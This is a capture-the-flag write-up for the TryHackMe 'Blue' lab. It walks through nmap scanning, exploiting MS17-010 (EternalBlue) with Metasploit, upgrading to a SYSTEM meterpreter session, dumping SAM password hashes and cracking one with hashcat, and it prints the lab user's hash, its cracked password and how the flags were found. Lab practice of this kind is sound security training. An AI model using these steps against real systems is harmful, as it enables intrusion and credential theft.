# Blue \(W\) \(wlk\)

_TryHackMe_ - [**Blue**](https://tryhackme.com/room/blue) Write-Up

_topics_: active reconnaissance, nmap, privesc by metasploit, password cracking, flags

**USE WITHOUT METASPLOIT**

## 1\) Enumeration \(nmap\)

* `nmap -sC -sV -oN nmap/initial`  

    sC: Scan with the default nmap scripts

    sV: Attempts to determine the version of the services running

    oN: Output scan in normal

* scan revealed 3 ports under 1000 open. \(135 MSRPC, 139 netbios-ssn, 445 microsoft-ds\)    
* OS: Windows 7 professional 6.1
* running SMB 
* scan is incomplete in searching for vulns. Nmap has a custom script to search for defaults
* `nmap -vv -sS --script vuln` __

    -vv: Very verbose

    -sS: Syn scan \(-sV for version number\)

    --script vuln: check for vulns using nmap scripting engine

* reveals same open ports
* vuln script reveals there is a high risk likelyhood it is vulnerable to ms17-010.RCE in Microsoft SMBv1 servers

## 2\) Metasploit

* search ms17-010
* exploit located at _/usr/share/doc/metasploit-framework/modules/exploit/windows/smb/ms17\_010\_eternalblue.md_
* _use_ 
* _show options_ 
* _set RHOST_ \(Remote Host\)  and press enter for the DOS shell
* _exploit_ and you have a low level shell on Windows versions earlier than 8. Using EternalBlue on unpatched systems using a vuln in SMBv1 protocol that causes a BO for RCE.

  3.2\) root

* must know how to convert shell to meterpreter with existing module
* _ctrlZ for background session, back to msf, search meterpreter, use shell 2 meter_
* tell module which sessionto bind to \(1\) and switch back _sessions -i_ 
* validate with _getsystem_ should return Admin status, shell and whoami to verify upgrade to NT AUTHORITY\SYSTEM

  -background session again, **just because we have system level privileges doesn't mean our process does**

* any process can be chosen, rule of thumb is powershell, cmd or microsoft office
* migrate meterpreter to PID
* _hashdump_: shows password hashes stored in SAM database, all passwords on the system as long as you have privileges. can be copied to text file and cracked

## 3\) Password Cracking \(hashes\)

* hashing converts passwords into unreadable strings of characters that are designed to be impossible to revert back
* Windows used to rely on LM hashing but transitioned to NTLM
* output password hash into a text file and crack it

    **user**: Jon

    **RID**: 1000

    **LM hash**: aad3b435b51404eeaad3b435b51404ee

    **NT hash**: ffb43f0de35be4d9917ac0cc8ad57f8d

* run hashcat against the file `hashcat --username --show -a 0 -m 1000`  __
* password was alqfna22

  5\) Finding flags

* we know that the flags are labeled 'flag1, flag2, flag3'
* cd to C:\
* search for flags in C directory: `dir flag.txt /s` and their locations will appear
* `type C:\flag1.txt` and so on \(type is equivalent to cat\)

